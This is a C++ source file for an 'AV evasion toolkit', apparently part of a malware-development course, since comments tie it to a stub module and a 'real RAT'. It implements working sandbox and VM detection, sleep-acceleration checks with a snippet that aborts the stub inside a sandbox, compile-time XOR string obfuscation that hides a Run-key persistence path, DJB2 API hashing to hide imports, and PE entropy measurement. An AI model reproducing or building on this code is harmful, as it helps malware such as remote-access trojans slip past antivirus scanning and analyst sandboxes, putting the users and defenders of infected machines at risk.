// av_evader.cpp — AV evasion toolkit
// Compile: g++ -std=c++17 -o av_evader.exe av_evader.cpp
// Usage:
//   av_evader.exe check                        — sandbox detection (6 checks)
//   av_evader.exe entropy  <file>              — per-section Shannon entropy
//   av_evader.exe obfuscate <string>           — runtime XOR/stack/rot13 variants
//   av_evader.exe obfstr   <string>            — emit compile-time ObfStr<N> template usage
//   av_evader.exe sleep-check                  — QPC-based sleep acceleration detection
//   av_evader.exe apihash  <dll> <func>        — DJB2 hash for API resolution
//   av_evader.exe resolve  <dll> <hash_hex>    — resolve function by DJB2 hash

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <stdio.h>
#include <stdint.h>
#include <string>
#include <vector>
#include <cmath>

// ─── Compile-time string obfuscation ─────────────────────────────────────────
// Key technique: XOR every byte at compile time so the literal never appears
// in .rdata; decode to a stack buffer at runtime.  Same pattern used in the
// full_stub (module 09) and the real RAT's Requests.cpp.
//
// Usage in code:
//   constexpr ObfStr OB_REGKEY("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
//   HKEY hk; RegOpenKeyExA(HKEY_CURRENT_USER, OB_REGKEY.d().c_str(), ...);
//
// Why this beats runtime-only XOR arrays: the XOR encoding happens entirely in
// the compiler — the object file never contains the plaintext.  A runtime array
// like `uint8_t enc[]={0x..}; for(i) buf[i]=enc[i]^key;` still has the key
// and array in .rdata; a motivated analyst trivially inverts it.
template <size_t N>
struct ObfStr {
    char data[N];
    constexpr ObfStr(const char (&s)[N]) : data{} {
        for (size_t i = 0; i < N; i++) data[i] = s[i] ^ 0x5A;
    }
    std::string d() const {
        std::string o(data, N - 1);
        for (char& c : o) c ^= 0x5A;
        return o;
    }
};

// ─── Sandbox detection ───────────────────────────────────────────────────────

static bool check_cpu_count() {
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}

static bool check_uptime() {
    return GetTickCount64() < 5ULL * 60 * 1000; // <5 min
}

static bool check_screen_res() {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    return (w < 800 || h < 600);
}

static bool check_username() {
    char buf[256]{};
    DWORD sz = sizeof(buf);
    GetUserNameA(buf, &sz);
    std::string u(buf);
    for (auto& c : u) c = (char)tolower(c);
    const char* known[] = {"sandbox", "malware", "virus", "sample", "analyst",
                            "john doe", "user", "test", "admin", nullptr};
    for (int i = 0; known[i]; ++i)
        if (u.find(known[i]) != std::string::npos) return true;
    return false;
}

static bool check_mouse_movement() {
    POINT p1{}, p2{};
    GetCursorPos(&p1);
    Sleep(1500);
    GetCursorPos(&p2);
    return (p1.x == p2.x && p1.y == p2.y);
}

static bool check_hypervisor() {
    int regs[4]{};
    __cpuid(regs, 1);
    return (regs[2] >> 31) & 1; // hypervisor present bit
}

static void cmd_check() {
    struct { const char* name; bool result; } checks[] = {
        {"CPU count < 2",        check_cpu_count()},
        {"Uptime < 5 min",       check_uptime()},
        {"Screen res < 800x600", check_screen_res()},
        {"Suspicious username",  check_username()},
        {"No mouse movement",    check_mouse_movement()},
        {"Hypervisor bit set",   check_hypervisor()},
    };
    int hits = 0;
    printf("=== Sandbox Detection ===\n");
    for (auto& c : checks) {
        printf("  %-24s %s\n", c.name, c.result ? "[SANDBOX]" : "[OK]");
        if (c.result) ++hits;
    }
    printf("\nScore: %d/6 — %s\n", hits,
        hits >= 3 ? "LIKELY SANDBOX" : hits >= 1 ? "SUSPICIOUS" : "CLEAN");
}

// ─── Shannon entropy ──────────────────────────────────────────────────────────

static double shannon(const uint8_t* data, size_t len) {
    if (!len) return 0.0;
    uint64_t freq[256]{};
    for (size_t i = 0; i < len; ++i) ++freq[data[i]];
    double h = 0.0;
    for (int i = 0; i < 256; ++i) {
        if (!freq[i]) continue;
        double p = (double)freq[i] / (double)len;
        h -= p * log2(p);
    }
    return h;
}

static void cmd_entropy(const char* path) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            nullptr, OPEN_EXISTING, 0, nullptr);
    if (hf == INVALID_HANDLE_VALUE) { fprintf(stderr, "Cannot open %s\n", path); return; }

    LARGE_INTEGER sz{};
    GetFileSizeEx(hf, &sz);
    HANDLE hm = CreateFileMappingA(hf, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hm) { CloseHandle(hf); return; }
    const uint8_t* base = (const uint8_t*)MapViewOfFile(hm, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hm); CloseHandle(hf); return; }

    printf("=== Entropy: %s ===\n", path);

    // whole-file entropy
    double total = shannon(base, (size_t)sz.QuadPart);
    printf("  Whole file: %.3f %s\n", total, total > 7.0 ? "<-- HIGH (packed/encrypted?)" : "");

    // PE section entropy
    if (sz.QuadPart > 0x40 && *(uint16_t*)base == 0x5A4D) {
        auto* dos = (IMAGE_DOS_HEADER*)base;
        auto* nth = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
        auto* sec = IMAGE_FIRST_SECTION(nth);
        WORD nsec = nth->FileHeader.NumberOfSections;
        for (WORD i = 0; i < nsec; ++i) {
            if (!sec[i].SizeOfRawData) { ++sec; continue; }
            const uint8_t* p = base + sec[i].PointerToRawData;
            double e = shannon(p, sec[i].SizeOfRawData);
            printf("  Section %-8.8s  size=%7u  entropy=%.3f%s\n",
                   (char*)sec[i].Name, sec[i].SizeOfRawData, e,
                   e > 7.0 ? "  <-- HIGH" : "");
            ++sec;
        }
    }

    UnmapViewOfFile(base);
    CloseHandle(hm);
    CloseHandle(hf);
}

// ─── String obfuscation demos ─────────────────────────────────────────────────

static void cmd_obfuscate(const char* s) {
    std::string str(s);
    printf("=== String Obfuscation: \"%s\" ===\n\n", s);

    // 1) XOR with key 0x5A
    printf("[1] XOR (key=0x5A):\n  const uint8_t enc[] = {");
    for (size_t i = 0; i < str.size(); ++i)
        printf("0x%02X%s", (uint8_t)(str[i] ^ 0x5A), i+1<str.size()?",":"");
    printf("};\n  // decode: for(i) buf[i]=enc[i]^0x5A;\n\n");

    // 2) Stack push (print as push sequence hint)
    printf("[2] Stack string hint (reverse order dwords):\n  // Push string bytes in groups of 4, reversed on stack\n");
    for (size_t i = 0; i < str.size(); i += 4) {
        uint32_t v = 0;
        for (int j = 0; j < 4 && i+j < str.size(); ++j)
            v |= (uint8_t)str[i+j] << (j*8);
        printf("  push 0x%08X\n", v);
    }
    printf("\n");

    // 3) Base64-like encoding (simple rotate+offset for illustration)
    printf("[3] Rot13 variant:\n  \"");
    for (char c : str) {
        if (c >= 'a' && c <= 'z') printf("%c", (char)('a' + (c - 'a' + 13) % 26));
        else if (c >= 'A' && c <= 'Z') printf("%c", (char)('A' + (c - 'A' + 13) % 26));
        else printf("%c", c);
    }
    printf("\"\n  // undo with same rot13\n");
}

// ─── Compile-time ObfStr code generator ──────────────────────────────────────

static void cmd_obfstr(const char* s) {
    std::string str(s);
    printf("// Compile-time ObfStr usage for: \"%s\"\n\n", s);
    printf("// Add this template once at the top of your file (key 0x5A):\n");
    printf("template <size_t N>\n");
    printf("struct ObfStr {\n");
    printf("    char data[N];\n");
    printf("    constexpr ObfStr(const char (&s)[N]) : data{} {\n");
    printf("        for (size_t i = 0; i < N; i++) data[i] = s[i] ^ 0x5A;\n");
    printf("    }\n");
    printf("    std::string d() const {\n");
    printf("        std::string o(data, N-1);\n");
    printf("        for (char& c : o) c ^= 0x5A;\n");
    printf("        return o;\n");
    printf("    }\n");
    printf("};\n\n");
    printf("// Then declare your string:\n");
    printf("constexpr ObfStr OB_STR(\"%s\");\n\n", s);
    printf("// And use it at runtime:\n");
    printf("//   OB_STR.d()          — returns std::string\n");
    printf("//   OB_STR.d().c_str()  — C string pointer\n\n");
    printf("// XOR-encoded bytes (key 0x5A) — what ends up in .rdata:\n");
    printf("//   { ");
    for (size_t i = 0; i < str.size(); ++i)
        printf("0x%02X%s", (uint8_t)(str[i] ^ 0x5A), i+1 < str.size() ? "," : "");
    printf(" }\n");
}

// ─── QPC sleep-acceleration detection ────────────────────────────────────────
// Sandboxes sometimes speed up Sleep() to get samples to execute faster.
// A QPC timing check catches this: measure actual elapsed time across Sleep().
// If the sandbox skips or shortens the sleep, QPC will show < expected time.

static void cmd_sleepCheck() {
    printf("=== QPC Sleep-Acceleration Detection ===\n\n");
    LARGE_INTEGER freq, t0, t1;
    QueryPerformanceFrequency(&freq);

    // Test 1: 2-second sleep
    printf("[*] Sleeping 2000ms...\n");
    QueryPerformanceCounter(&t0);
    Sleep(2000);
    QueryPerformanceCounter(&t1);
    double elapsed1 = (double)(t1.QuadPart - t0.QuadPart) / freq.QuadPart;
    printf("    QPC elapsed: %.3f s  %s\n", elapsed1,
           elapsed1 < 0.9 ? "[ACCELERATED — SANDBOX]" : "[OK]");

    // Test 2: 1-second sleep in a loop (some sandboxes only accelerate long sleeps)
    printf("[*] Sleeping 3x 500ms...\n");
    double total = 0;
    for (int i = 0; i < 3; ++i) {
        QueryPerformanceCounter(&t0);
        Sleep(500);
        QueryPerformanceCounter(&t1);
        total += (double)(t1.QuadPart - t0.QuadPart) / freq.QuadPart;
    }
    printf("    QPC elapsed: %.3f s (expected ~1.5s)  %s\n", total,
           total < 0.7 ? "[ACCELERATED — SANDBOX]" : "[OK]");

    // Verdict
    bool sandbox = (elapsed1 < 0.9) || (total < 0.7);
    printf("\nVerdict: %s\n", sandbox ? "SANDBOX DETECTED (sleep acceleration)" : "Clean environment");
    printf("\nHow to use in a stub:\n");
    printf("  LARGE_INTEGER f,t0,t1; QueryPerformanceFrequency(&f);\n");
    printf("  QueryPerformanceCounter(&t0); Sleep(3000); QueryPerformanceCounter(&t1);\n");
    printf("  double e = (double)(t1.QuadPart-t0.QuadPart)/f.QuadPart;\n");
    printf("  if (e < 1.5) ExitProcess(0); // in sandbox — abort\n");
}

// ─── API hashing (DJB2) ───────────────────────────────────────────────────────

static uint32_t djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h;
}

static void cmd_apihash(const char* dll, const char* func) {
    uint32_t h = djb2(func);
    printf("DJB2(\"%s\") = 0x%08X\n", func, h);
    printf("DJB2(\"%s\")  = 0x%08X\n\n", dll, djb2(dll));
    printf("// Resolver usage:\n");
    printf("//   FARPROC fn = resolve_export(\"%s\", 0x%08X);\n", dll, h);
}

static FARPROC resolve_export(const char* dll_name, uint32_t target_hash) {
    HMODULE hMod = LoadLibraryA(dll_name);
    if (!hMod) return nullptr;
    auto* base = (const uint8_t*)hMod;
    auto* dos  = (IMAGE_DOS_HEADER*)base;
    auto* nth  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* dir  = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir->VirtualAddress) return nullptr;
    auto* exp  = (IMAGE_EXPORT_DIRECTORY*)(base + dir->VirtualAddress);
    auto* names  = (DWORD*)(base + exp->AddressOfNames);
    auto* funcs  = (DWORD*)(base + exp->AddressOfFunctions);
    auto* ords   = (WORD* )(base + exp->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)(base + names[i]);
        if (djb2(name) == target_hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return nullptr;
}

static void cmd_resolve(const char* dll, const char* hash_hex) {
    uint32_t h = (uint32_t)strtoul(hash_hex, nullptr, 16);
    FARPROC fn = resolve_export(dll, h);
    printf("Resolving 0x%08X in %s ...\n", h, dll);
    if (fn) printf("  Found at: 0x%p\n", fn);
    else    printf("  Not found.\n");
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:\n"
               "  av_evader.exe check                      — sandbox detection\n"
               "  av_evader.exe entropy    <file>          — Shannon entropy per section\n"
               "  av_evader.exe obfuscate  <string>        — runtime obfuscation variants\n"
               "  av_evader.exe obfstr     <string>        — emit compile-time ObfStr<N> code\n"
               "  av_evader.exe sleep-check                — QPC sleep acceleration test\n"
               "  av_evader.exe apihash    <dll> <func>    — DJB2 hash for import hiding\n"
               "  av_evader.exe resolve    <dll> <hash>    — resolve export by DJB2 hash\n");
        return 1;
    }
    std::string cmd(argv[1]);
    if      (cmd == "check")                   { cmd_check(); }
    else if (cmd == "entropy"     && argc >= 3) { cmd_entropy(argv[2]); }
    else if (cmd == "obfuscate"   && argc >= 3) { cmd_obfuscate(argv[2]); }
    else if (cmd == "obfstr"      && argc >= 3) { cmd_obfstr(argv[2]); }
    else if (cmd == "sleep-check")              { cmd_sleepCheck(); }
    else if (cmd == "apihash"     && argc >= 4) { cmd_apihash(argv[2], argv[3]); }
    else if (cmd == "resolve"     && argc >= 4) { cmd_resolve(argv[2], argv[3]); }
    else { fprintf(stderr, "Unknown command or missing args.\n"); return 1; }
    return 0;
}
